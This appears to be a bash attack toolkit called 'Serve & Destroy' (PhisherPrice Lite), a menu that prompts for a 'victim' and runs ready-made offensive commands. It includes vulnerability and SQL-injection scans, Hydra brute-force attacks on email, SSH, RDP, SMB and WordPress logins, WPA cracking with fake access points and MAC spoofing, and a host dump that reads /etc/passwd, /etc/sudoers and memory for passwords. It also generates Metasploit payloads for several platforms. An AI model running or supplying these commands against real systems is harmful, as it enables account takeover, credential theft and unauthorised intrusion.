#!/bin/bash
##############################
##     Serve & Destroy      ##
##############################
##  Created By Sir Cryptic  ##
############################## 
##  Developer Sir Cryptic   ## 
##############################
##    NULL Security Team    ##
##       Greetz Mobly       ##
##       Greetz R!ff        ##
##############################
############################## 
##      Developed On        ##
##   Kali Linux 2020.2b     ##
##           &              ##
##        Parrot OS         ##
##############################
i="0"
clear
while [ $i -lt 1 ]
do
clear
 
#COLOUR
red='\e[1;31m'
yellow='\e[0;33m'
Blue='\e[1;34m'
Reset='\e[0;0m'
title="S&D"
echo -e '\033]2;'$title'\007'

echo -e '\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <    PhisherPrice Lite
   /<<< \_\_  Serve & Demolish
  /,)^>>_._ \ Version 1.0.3 [BETA] 
  (/   \\ /\\\    [\e[3;31m PUBLIC \e[1;33m]
       // //```
------((`((--------------------\e[0m\e[3;39m
(1) Scanners
(2) Cracking
(3) MSF Payload
(4) OSINT
(5) Other Tools
(i) Information \e[1;33m
------------------------------- \e[0m\e[3;39m
       CTRL + C To Exit \e[1;33m
-------------------------------'
echo -e $Blue" ┌─["$red"S&D$Blue]──[$red~$Blue]─["$yellow"Main$Blue─"$yellow"Menu$Blue]"
read -p      " └─────► " x
option1='1'
option2='2'
option3='3'
option4='4'
option5='5'
info='i'
quit='q'

if [ "$x" == "$option1" ]; then                    #Option1
clear
echo -e '\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <    PhisherPrice Lite
   /<<< \_\_  Serve & Demolish
  /,)^>>_._ \ Version 1.0.3 [BETA] 
  (/   \\ /\\\    [\e[3;31m PUBLIC \e[1;33m]
       // //```
------((`((--------------------\e[3;31m 
Scanners \e[1;33m 
------------------------------- \e[0m\e[3;39m
(1) Metasploit Nmap (w/Vuln Scan)
(2) Nikto Scan (Vuln Scan) 
(3) Nmap Scan (w/OS Detection)
(4) SSLyze (Vuln Scan ~ Regular)
(5) Metasploit Heartbleed Scanner
(6) SQL Map
(7) Wapiti3
(8) DirSearch
(9) DNS Recon \e[1;33m
------------------------------- \e[0m\e[3;39m
       CTRL + C To Exit \e[1;33m
------------------------------- \e[0m\e[3;39m
Press ENTER To Go To Main Menu \e[1;33m
------------------------------- \e[0m\e[3;39m'
echo -e $Blue" ┌─["$red"S&D$Blue]──[$red~$Blue]─["$yellow"Scanners$Blue]"
read -p      " └─────► " x
submenu1='1'
submenu2='2'
submenu3='3'
submenu4='4'
submenu5='5'
submenu6='6'
submenu7='7'
submenu8='8'
submenu9='9'

if [ "$x" == "$submenu1" ]; then                    #submenu-Option-1
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
METASPLOIT VULNERABILITY SCAN
\e[0;31m-------------------------------\e[1;34m'
echo "Victim's IP Or Website:"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'

msfconsole -q -x "nmap -v --script vuln $r ;exit ;"
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$submenu2" ]; then                    #submenu-Option-2
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
NIKTO VULNERABILITY SCAN
\e[0;31m-------------------------------\e[1;34m'
echo "Victim's IP Or Website:"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'

nikto -Display 1234EP -evasion 1 -Tuning 123bde -host $r
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$submenu3" ]; then                    #submenu-Option-3
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
NMAP SCAN W/OS DETECTION
\e[0;31m-------------------------------\e[1;34m'
echo "Victim's IP Or Website:"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
sudo nmap -Pn -O $r
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read


elif [ "$x" == "$submenu4" ]; then                    #submenu-Option-4
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
SSL VULNERABILITY SCAN
\e[0;31m-------------------------------\e[1;34m'
echo "Victim's IP Or Website:"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
sslyze --regular $r
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$submenu5" ]; then                    #submenu-Option-5
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
HEARTBLEED VULNERABILITY SCAN
\e[0;31m-------------------------------\e[1;34m'
echo "Victim's IP Or Website:"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
msfconsole -q -x "use auxiliary/scanner/ssl/openssl_heartbleed;set verbose true; set rhosts $r ; exploit ;exit ;"
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read


elif [ "$x" == "$submenu6" ]; then                    #submenu-Option-6
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
SQLMAP SCAN
\e[0;31m-------------------------------\e[1;34m'
echo "Victim's IP Or Website:"
echo -e '\e[0;31m-------------------------------'
echo "This Will Audit Database's Automatically"
echo "Using Random User-Agents."
echo "Enter Domain Name Or IP"
read -p "~" sql1
echo "Database Type If You Know It, If Not Leave This Blank"
echo "Press Enter If You're Unsure"
read -p "~" db
echo "Level of tests to perform (1-5, default 1)"
read levelt
echo "Risk of tests to perform (1-3, default 1)"
read -p "~" risksl
echo "SQL injection techniques to use (default : BEUSTQ)"
echo "Press Enter To Leave Default"
read -p "~" techskill
echo -e '\e[0;31m-------------------------------\e[0;39m'
sqlmap --dbms=$db --forms --crawl=2 --level=$levelt --risk=$risksl --random-agent --all --technique=$techskill -u $sql1
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$submenu7" ]; then                    #submenu-Option-7
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
WAPITI3 VULNERABILITY SCAN
\e[0;31m-------------------------------\e[1;34m'
echo "please choose http or https ?"
echo -e '\e[0;31m-------------------------------'
read -p "~" suredid
echo -e '\e[0;31m-------------------------------\e[1;34m'
echo "Victim's Website:"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
wapiti -u $suredid://$r/
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$submenu8" ]; then                    #submenu-Option-8
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
DIRECTORY SEARCH SCAN
\e[0;31m-------------------------------\e[1;34m'
echo "Victim's IP Or Website:"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
cd&&cd dirsearch&&python3 dirsearch.py -u $r -e php,txt,zip,java,js,html,css
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read

elif [ "$x" == "$submenu9" ]; then                    #submenu-Option-10
clear
echo -e '\e[0;31m-------------------------------\e[1;33m
DNS RECON
\e[0;31m-------------------------------\e[1;34m'
echo "Victim's IP Or Website:"
echo -e '\e[0;31m-------------------------------'
read -p "~" r
echo -e '\e[0;31m-------------------------------\e[0;39m'
dnsrecon -d $r
echo ' '
echo '           Press ENTER to Main Menu '
echo ' '
read


else 

n


fi

elif [ "$x" == "$option2" ]; then                          #Option2
clear
echo -e '\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <    PhisherPrice Lite
   /<<< \_\_  Serve & Demolish
  /,)^>>_._ \ Version 1.0.3 [BETA] 
  (/   \\ /\\\    [\e[3;31m PUBLIC \e[1;33m]
       // //```
------((`((--------------------\e[3;31m 
Cracking / Brute Force \e[1;33m 
------------------------------- \e[0m\e[3;39m
(1) Auto-Brute (Hydra)
(2) John-The-Ripper
(3) Hash-Identifier
(4) Hashcat
(5) Aircrack-ng (Crack Wifi Pass)
(6) Start sqldict
(7) Wifi Honey Pot Cracker
(8) Just Dump It
(9) Show Users Without A Password \e[1;33m
------------------------------- \e[0m\e[3;39m
       CTRL + C To Exit \e[1;33m
------------------------------- \e[0m\e[3;39m
Press ENTER To Go To Main Menu \e[1;33m
------------------------------- \e[0m\e[3;39m'
echo -e $Blue" ┌─["$red"S&D$Blue]──[$red~$Blue]─["$yellow"Cracking$Blue]"
read -p      " └─────► " x

subf='1'
subg='2'
subh='3'
subi='4'
subj='5'
subk='6'
honeywhy='7'
dumpitall='8'
nopass='9'

if [ "$x" == "$subf" ]; then                    #Sub-Option-f
clear
echo -e '\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <    PhisherPrice Lite
   /<<< \_\_  Serve & Demolish
  /,)^>>_._ \ Version 1.0.3 [BETA] 
  (/   \\ /\\\    [\e[3;31m PUBLIC \e[1;33m]
       // //```
------((`((--------------------\e[3;31m 
Hydra Auto-Brute \e[1;33m 
------------------------------- \e[0m\e[3;39m
(1) Email Crack (SMTP)
(2) SNMP Brute Force
(3) FTP Brute Force
(4) SSH  Brute Force
(5) SSH  Brute Force (port 22)
(6) POP3 Brute Force
(7) HTTP 401 Brute Force
(8) Windows RDP Brute Force
(9) SMB Brute Force
(10) WP AUTO BRUTE \e[1;33m
------------------------------- \e[0m\e[3;39m
       CTRL + C To Exit \e[1;33m
------------------------------- \e[0m\e[3;39m
Press ENTER To Go To Main Menu \e[1;33m
------------------------------- \e[0m\e[3;39m'
echo -e $Blue" ┌─["$red"S&D$Blue]──[$red~$Blue]─["$yellow"Hydra$Blue]"
read -p      " └─────► " x

hynull1='1'
hynull2='2'
hynull3='3'
hynull4='4'
hynull5='5'
hynull6='6'
hynull7='7'
hynull8='8'
newoption1='9'
HYDRAWPAUTOBRUTE='10'

if [ "$x" == "$hynull1" ]; then                    #hynull-Option-1
clear
echo -e '\e[1;33m
Email Crack\e[1;34m
'
echo "Simple Email Cracking Script Using Hydra."
echo "Written By: NULLSec"
echo "NOTE: Make sure you have wordlists!"
echo "Let us Begin:"
echo "Choose a SMTP service: Gmail = smtp.gmail.com / Yahoo = smtp.mail.yahoo.com / Hotmail = smtp.live.com /:"
read smtp
echo "Enter Email Address:"
read email
echo "Provide Directory of Wordlist for Passwords:"
read wordlist
clear

hydra -S -l $email -P $wordlist -e ns -V -s 465 $smtp smtp

read

elif [ "$x" == "$hynull2" ]; then                    #hynull-Option-2
clear
echo -e '\e[1;33m
SNMP Brute Force \e[1;34m
'
echo "Enter The Password List Location"
read hydrasnmppass
echo "Enter The Host IP Address of SNMP Server"
read hydraip

hydra -P $hydrasnmppass -v $hydraip snmp

read

elif [ "$x" == "$hynull3" ]; then                    #hynull-Option-3
clear
echo -e '\e[1;33m
FTP Brute Force\e[1;34m
'
echo "Enter Known User"
read hydrauser1
echo "Enter The Password List Location:"
read hydrapasslist1
echo "Enter The IP Address"
read hydraip1

hydra -t 1 -l $hydrauser1 -P $hydrapasslist1 -vV $hydraip1 ftp

read

elif [ "$x" == "$hynull4" ]; then                    #hynull-Option-4
clear
echo -e '\e[1;33m
SSH Brute Force \e[1;34m
'
echo "Enter Your User List Location"
read hydrauser2
echo "Enter The Password List Location:"
read hydrapasslist2
echo "Enter The IP Address"
read hydraip2

hydra -v -V -u -L $hydrauser2 -P $hydrapasslist2 -t 1 -u $hydraip2 ssh

read

elif [ "$x" == "$hynull5" ]; then                    #hynull-Option-5
clear
echo -e '\e[1;33m
SSH Brute Force P22\e[1;34m
'
echo "Enter Your Known User"
read hydrauser3
echo "Enter The Password List Location:"
read hydrapasslist3
echo "Enter The IP Address"
read hydraip3

hydra $hydraip3 -s 22 ssh -l $hydrauser3 -P $hydrapasslist3

read

elif [ "$x" == "$HYDRAWPAUTOBRUTE" ]; then                    #hynull-Option-9
clear
echo "Hydra WP Auto Brute"
echo "Url (ex:target.com) : http://" 
read url
echo "Path (ex:/wp-login.php) : " 
read path
echo "User (ex:admin or /path/wordlist.txt) : " 
read user
echo "Pass (ex:12345 or /path/wordlist.txt) : " 
read pass
echo "Bad Login (ex:wrong) : " 
read bad
echo "Parameter (ex:username=^USER^&password=^PASS^) : " 
read parameter
sleep 1
echo "[+] Execute : http://$url/$path"
sleep 0.5
echo "[+] User : $user"
sleep 0.5
echo "[+] Pass : $pass"
sleep 0.5
echo "[+] Bad Login : $bad"
sleep 0.5
echo "[+] Parameter : $parameter"
sleep 0.5
hydra -I $url http-post-form $path:$parameter:$bad -l $user -P $pass

read

elif [ "$x" == "$hynull6" ]; then                    #hynull-Option-6
clear
echo -e '\e[1;33m
POP3 Brute Force \e[1;34m
'
echo "Enter Your Known User Or UserList"
read hydrauser4
echo "Enter The Password List Location:"
read hydrapasslist4
echo "Enter The IP Address"
read hydraip4


hydra -l $hydrauser4 -P $hydrapasslist4 -f $hydraip4 pop3 -V

read

elif [ "$x" == "$hynull7" ]; then                    #hynull-Option-7
clear
echo -e '\e[1;33m
401 Brute Force \e[1;34m
'
echo "Enter Your Known User Or UserList"
read hydrauser5
echo "Enter The Password List Location:"
read hydrapasslist5
echo "Enter The IP Address"
read hydraip5
echo "enter the 401 Login"
read hyhost

hydra -L $hydrauser5 -P $hydrapasslist5 $hydraip5 http-get /$hyhost

read

elif [ "$x" == "$hynull8" ]; then                    #hynull-Option-8
clear
echo -e '\e[1;33m
RDP Brute Force \e[1;34m
'
echo "Enter Your Known User Or UserList"
read hydrauser8
echo "Enter The Password List Location:"
read hydrapasslist8
echo "Enter The IP Address"
read hydraip8

hydra -t 1 -V -f -l $hydrauser8 -P $hydrapasslist8 rdp://$hydraip8

read

elif [ "$x" == "$newoption1" ]; then                    #hynull-Option-9
clear
echo -e '\e[1;33m
SMB Brute Force \e[1;34m
'
echo "Enter Your Known User Or UserList"
read hydrauser9
echo "Enter The Password List Location:"
read hydrapasslist9
echo "Enter The IP Address"
read hydraip9


hydra -t 1 -V -f -l $hydrauser9 -P $hydrapasslist9 $hydraip9 smb

read

else 

n


fi

elif [ "$x" == "$subg" ]; then                    #Sub-Option-g
echo "enter your wordlist eg :/usr/share/john/password.lst"
read jwords
echo "Enter File Location eg: /usr/john/Documents/unshadowed.txt"
read $jfiles
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!Gathering Information About Host!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
'

john --wordlist=$jwords --rules $jfiles

read

elif [ "$x" == "$subh" ]; then                    #Sub-Option-h
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!     CTRL + C TO QUIT         !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'
hash-identifier

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!           Good Bye               !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

read

elif [ "$x" == "$subi" ]; then                    #Sub-Option-i
clear
echo -e '\e[1;33m
HASHCAT\e[1;34m
'
echo "Enter Hash Type: 500 = md5crypt"
read encmode
echo "Enter Hash Hocation eg: /usr/share/me/example500.hash"
read hashtype
echo "Enter Wordlist Location eg: /usr/share/wordlists/sqlmap.txt"
read hashpass1
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!  Attempting to Crack Hash Type   !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

hashcat -m $encmode $hashtype $hashpass1

read

elif [ "$x" == "$subj" ]; then                    #Sub-Option-j
clear
echo -e '\e[1;33m
 AIRCRACK-NG \e[1;34m
'
echo "Enter Password List Location"
read wifirip
echo "Enter filename.cap location"
read subopi
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!   Attempting to Crack WPA    !!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

aircrack-ng -w $wifirip $subopi

echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!         DID WE DO IT ?            !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

read

elif [ "$x" == "$subk" ]; then                    #Sub-Option-k
clear
echo -e '
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!         Launching SQLdict         !!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 
'

sqldict

read

elif [ "$x" == "$honeywhy" ]; then                    #hynull-Option-9
clear
# Get user dictionary
echo -n "Enter the directory along with the wordlist name and extension"
read dictpass
# Get wireless interface
echo -n "Enter wireless interface (e.g. wlan1 or wlan0): "
read iface

# Put wireless interface into monitor mode
echo "Putting wireless interface into monitor mode..."
ip link set dev $iface down
macchanger -r $iface
ip link set dev $iface up
airmon-ng start $iface

# Get target ESSID and channel
echo -n "Enter target ESSID: "
read essid
echo -n "Enter target channel: "
read ch

# Create four fake access points
echo "Creating four fake access points with name $essid..."
xterm -hold -e "airbase-ng --essid $essid -a aa:aa:aa:aa:aa:aa -c $ch mon0" &
pid1=$!
xterm -hold -e "airbase-ng --essid $essid -a bb:bb:bb:bb:bb:bb -c $ch mon0 -W 1" &
pid2=$!
xterm -hold -e "airbase-ng --essid $essid -a cc:cc:cc:cc:cc:cc -c $ch mon0 -W 1 -z 2" &
pid3=$!
xterm -hold -e "airbase-ng --essid $essid -a dd:dd:dd:dd:dd:dd -c $ch mon0 -W 1 -Z 4" &
pid4=$!

# Capture and save handshake
echo -n "Enter a name for the output file: "
read fname
xterm -hold -e "airodump-ng --channel $ch --write $fname mon0" &
pid5=$!

# Attempt to crack the password
echo "Attempting to crack password using a strong dictionary..."
aircrack-ng -w $dictpass $fname-01.cap

# Cleanup
echo "Cleaning up..."
kill $pid1 $pid2 $pid3 $pid4 $pid5
airmon-ng stop mon0
read

elif [ "$x" == "$dumpitall" ]; then                    #hynull-Option-9
# A modified version of Gary Hooks' work sys_info.sh:
# 	Original Author: Gary Hooks
# 	Web: http://www.twintel.co.uk
# Supporting input from:
#	MYero
#	JGuz
#	SANDFLY SECURITY Linux Compromise Assessment Cmd Cheat Sheet
# Publish Date: 13th May 2020
# Version: 1.2
# Licence: GNU GPL 

current_time=$(date "+%Y.%m.%d-%H.%M.%S")
folderName="${current_time}_Linux_Data_Dump"
mkdir "$folderName"
OutputFileName="${current_time}_Linux_Data_Dump.rtf"
DEL_RUNNING="\b\b\b\b\b\b\b\b"
CLEAR_EOL=$(tput el)

# First Param: System Name
# Second Param: String describing the overall contents of the file
# Example Useage: insertHeader "MaxEdge" "Passwords in clear text" 
function insertHeader()
{
	printf "########################################################################\n" | tee -a $CURRENT_FILE
	printf "###                  Linux Data Dump                                 ###\n" | tee -a $CURRENT_FILE
	printf "###                       $1                             ###\n" | tee -a $CURRENT_FILE
	printf "###                       $2                                   ###\n" | tee -a $CURRENT_FILE
	printf "########################################################################\n\n" | tee -a $CURRENT_FILE
}

# First Param: Subsection title
# Example usage: insertPartition "ARP Tables"
function insertPartition()
{
    printf -- "\n----------------------------$1----------------------------------------\n" | tee -a $CURRENT_FILE
}

# First Param: String with Descriptive Title
# Second Param: String with actual command
# Example Usage: runTest "List of Files in Current Folder" "ls -lah"

function runTest()
{
    NAME_OF_TEST=$1
    COMMAND_TO_RUN=$2
    printf "$1 - Running"
    insertPartition $1
    printf "($2)\n" >> $CURRENT_FILE
    eval $2 >> $CURRENT_FILE
    printf "\n\n" >> $CURRENT_FILE
    printf "$DEL_RUNNING Saved$CLEAR_EOL\n"
}

echo "Project Name: "
read projectName

##++++++++++++++++ System Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/system_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "General_Information"
runTest "Host_Name" "hostname"
runTest "Host_IP" "hostname -I"
runTest "Domain_Name" "domainname"
runTest "Connectivity_Check" "ping -c 4 8.8.8.8"
runTest "Who_Am_I" "whoami"
runTest "Uptime" "uptime"
runTest "System_Name_&_Version" "uname -a"
COMMAND_STRING='lsb_release -a 2>/dev/null | grep -E "Distributor|Description|Release"'
insertPartition "Distributer,_Description,_Release"
printf "($COMMAND_STRING)\n" >> $CURRENT_FILE
eval $COMMAND_STRING >> $CURRENT_FILE
printf "\n\n" >> $CURRENT_FILE
runTest "Logged_In_Users" "who -a"
#Last Logins list length; Full List: last -a; 
runTest "Last_10_Logins" "last -a | head -10"
runTest "Currently_Connected" "w"
runTest "List_User_Accounts" "cat /etc/passwd"
runTest "List_Sudoers_File" "cat /etc/sudoers"
runTest "Available_Shells" "cat /etc/shells | tail -n +2"
runTest "Environment_Variables" "env"


##++++++++++++++++ Memory Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/memory_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Storage_&_Memory_Data"
runTest "Block_&_Storage_Devices" "lsblk -a"
runTest "Find_Mounted_Filesystems" "findmnt -A"
runTest "File_System_&_Partitions" "df -h"
runTest "Ram_Info" "free -m"
runTest "Memory_Info" "cat /proc/meminfo"
runTest "Find_Hiden_Directories" 'find / -type d -name".*"'

##++++++++++++++++ Network Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/network_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Network_Info"
runTest "Host_Name" "hostname"
runTest "Domain_Name" "domainname"
runTest "Connectivity_Check" "ping -c 4 8.8.8.8"
runTest "Interface_Information(IFCONFIG)" "ifconfig -a"
runTest "Interface_Information(IP)" "ip address"
runTest "Routing_Table" "route -n"
runTest "IP_Tables" "iptables -t nat -vnL"
runTest "ARP_Table" "arp -a"
runTest "Net_Stat_(all)" "netstat -a"
runTest "Net_Stat_(Listening)" "netstat -lapn"
runTest "Listening_Ports" "ss -lntu"
runTest "Current_Connections" "ss -s"
runTest "Resolve_Conf" "cat /etc/resolv.conf"
###runTest "Firewall_Rules" "firewall-cmd --list-all"
runTest "UFW_Firewall_Rules_Verbose" "ufw status verbose"
runTest "UFW_Firewall_Rules_Numbered" "ufw status numbered"

##++++++++++++++++ Hardware Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/hardware_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Hardware_Info"
runTest "CPU_Info" "lscpu"
insertPartition "Device_List"
row_count=$(lspci | wc -l)
for (( c=1; c<=${row_count}; c++ ))
do
	lspci| sed  "${c}q;d" | cut -c 9- | tee -a $CURRENT_FILE
done
runTest "PCI_Devices" "lspci"
runTest "PCI_Devices_(Detailed)" "lspci -v"
runTest "USB_Devices" "lsusb"
runTest "USB_Devices_(Detailed)" "lsusb -v"
###runTest "Dmesg_Info" "dmesg"


##++++++++++++++++ Software Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/software_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Software_Info"
insertPartition "Common_Packages"
#checks if packages in the list are installed and tells thier version
packages=("python" "python3" "mysql" "ruby" "perl" "bash" "ssh" "telnet")
#packages can be added above to search more packages
for i in "${packages[@]}"
do
    version=$(apt-cache show $i 2>/dev/null | grep -m 1 Version | wc -l )
    DETAIL="NOT INSTALLED"
	if [ $version == 1 ]
	then    #if the package is installed, show the version
		DETAIL=$(apt-cache show $i 2>/dev/null | grep -m 1 Version | awk '{ printf "VERSION:" $2 "\n" }' )
	fi
	printf "PACKAGE:${i}\t $DETAIL \n" | tee -a $CURRENT_FILE
done
runTest "Loadable_Kernel_Modules" "lsmod"
runTest "Startup_Programs" "ls -lah /etc/init.d/"
runTest "Installed_Programs" "apt list --installed"
runTest "Services_Programs" "service --status-all"
runTest "Systemctl_Programs" "systemctl status --all"

##++++++++++++++++ Process Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/process_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Process Info"
runTest "Top_5_CPU_Processes" "ps auxwwwf | sort -nr -k 3 | head -5"
runTest "Top_5_Mem_Processes" "ps auxwwwf | sort -nr -k 4 | head -5"
runTest "Current_Processes" "ps auxwwwf"
runTest "Directory_of_Running_Processes" "ls -l /proc/*/cwd"
runTest "Executable_of_Running_Processes" "ls -l /proc/*/exe"
runTest "Arguements_of_Running_Processes" "grep -a ^ /proc/*/cmdline"
runTest "Deleted_Binaries_Still_Running" "ls -aIR /proc/*/exe 2>/dev/null | grep deleted"
# Running from tmp and dev need more testing/verification of functionality
runTest "Proccesses Running From tmp" "ls -aIR /proc/*/cwd 2>/dev/null | grep tmp"
runTest "Proccesses Running From dev" "ls -aIR /proc/*/cwd 2>/dev/null | grep dev"
runTest "Cmd_History_Files" "find / -name *.history"
runTest "Cmd_History" "history"

##++++++++++++++++ Password Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/password_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Passwords"

#This search for clear text passwords TAKES A LONG TIME
COMMAND_STRING='grep -rnw "/" -ie "PASSWORD" 2> /dev/null'
insertPartition "Clear_Text_Passwords"
printf "($COMMAND_STRING)\n" >> $CURRENT_FILE
eval $COMMAND_STRING >> $CURRENT_FILE
printf "\n\n" >> $CURRENT_FILE

runTest "More_Clear_Text_Passwords" 'find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;'
runTest "Passwords_In_Memory" 'strings /dev/mem -n10 | grep -i PASS'

##++++++++++++++++ Misc Data.rtf+++++++++++++++++++++++
CURRENT_FILE=$folderName/misc_data.rtf
touch $CURRENT_FILE
insertHeader $projectName "Misc_Data"
runTest "SUID_Binaries" "find / -perm -4000 -type f -exec ls -la {} 2>/dev/null"
runTest "SGID_Binaries" "find / -perm -2000 -type f -exec ls -la {} 2>/dev/null"
runTest "Binaries_Of_Interest" "find / -uid 0 -perm -4000 -type f 2>/dev/null"
runTest "World_Writable_Files" "find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null"
runTest "World_Writable_Files" "find / -perm -2 -type f 2>/dev/null"
runTest "World_Writable_Files" "find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null"
runTest "Crontab_Jobs" "crontab -l"

## Collect Logs: find /var/log -mtime -$logDate -exec cp {} $tmp/logs/ \; nested folders are huge!!


##++++++++++++++++ Docker Data.rtf+++++++++++++++++++++++
## CURRENT_FILE=$folderName/docker_data.rtf
## touch $CURRENT_FILE
## insertHeader $projectName "Docker_Container_Enumeration"
        
## runTest "" ""     https://docs.docker.com/engine/reference/commandline/container_ls/


##++++++++++++++++ Zip Data and Remove Files +++++++++++++++++++++++
CURRENT_FILE=$folderName/system_data.rtf
DATE=$(date +"%d %B %Y")
TIME=$(date +"%T")
CURRENT_PATH=$(pwd)
printf "\n\n" | tee -a $CURRENT_FILE
printf "Process Completed\n" | tee -a $CURRENT_FILE
printf -- "------------------------------------\n" | tee -a $CURRENT_FILE
printf "End Time: \t $TIME\n" | tee -a $CURRENT_FILE
printf "End Date: \t $DATE\n" | tee -a $CURRENT_FILE
printf "\n\n" | tee -a $CURRENT_FILE

## END ##
FINAL_PATH="$CURRENT_PATH/$folderName.tgz"
printf "Compressing Results into Package\n\n"
tar -czvf $FINAL_PATH $folderName/*
printf "\nCleaning up\n\n"
rm -rf $folderName
printf "Results will be stored here: \t $FINAL_PATH \n\n"

read
elif [ "$x" == "$nopass" ]; then                    #hynull-Option-9
get_user_names(){
  nopass=`passwd -${1}a | grep -o "^.* NP"`

  for i in ${nopass/ /_}
  {
    nopassnames="${nopassnames:- } $i"
  }
}

if [[ "$OSTYPE" == *linux-gnu* ]]; then
  get_user_names S
elif [[ "$OSTYPE" == *sunos* ]]; then
  get_user_names s
fi

if [ -z "$nopassnames" ]
  then
    echo "Good - All user accounts have a password."
  else
    echo "ERROR: The users listed below have no password set:"\
         "       ${nopassnames//_NP/}" 1>&2
    exit 1
fi

read

else 

n


fi

elif [ "$x" == "$option3" ]; then                          #Option3
clear
echo -e '\e[1;33m
///,        ////
\  /,      /  >.
 \  /,   _/  /.
  \_  /_/   /.
   \__/_   <    PhisherPrice Lite
   /<<< \_\_  Serve & Demolish
  /,)^>>_._ \ Version 1.0.3 [BETA] 
  (/   \\ /\\\    [\e[3;31m PUBLIC \e[1;33m]
       // //```
------((`((--------------------\e[3;31m 
MSF Payload \e[1;33m 
------------------------------- \e[0m\e[3;39m
(1) Windows
(2) Linux
(3) OSX
(4) APK
(5) ASP
(6) ASPX
(7) Bash
(8) Java
(9) Perl
(10) PHP
(11) Powershell
(12) Python
(13) Tomcat
(c) Launch msfconsole \e[1;33m
------------------------------- \e[0m\e[3;39m
       CTRL + C To Exit \e[1;33m
------------------------------- \e[0m\e[3;39m
Press ENTER To Go To Main Menu \e[1;33m
------------------------------- \e[0m\e[3;39m'
echo -e $Blue" ┌─["$red"S&D$Blue]──[$red~$Blue]─["$yellow"MSFP$Blue]"
read -p      " └─────► " x
cyouro1='1'
cyouro2='2'
cyouro3='3'
cyouro4='4'
cyouro5='5'
cyouro6='6'
cyouro7='7'
cyouro8='8'
cyouro9='9'
cyouro10='10'
cyouro11='11'
cyouro12='12'
cyouro13='13'
cyouro14='c'

if [ "$x" == "$cyouro1" ]; then                    #cyouro-Option-1
clear

msfpc windows bind 5555 verbose

read

elif [ "$x" == "$cyouro2" ]; then                    #cyouro-Option-2

clear
msfpc linux bind 5555 verbose

read

elif [ "$x" == "$cyouro3" ]; then                    #cyouro-Option-3
clear

msfpc osx bind 5555 verbose

read

elif [ "$x" == "$cyouro4" ]; then                    #cyouro-Option-4

clear

msfpc apk bind 5555 verbose

read

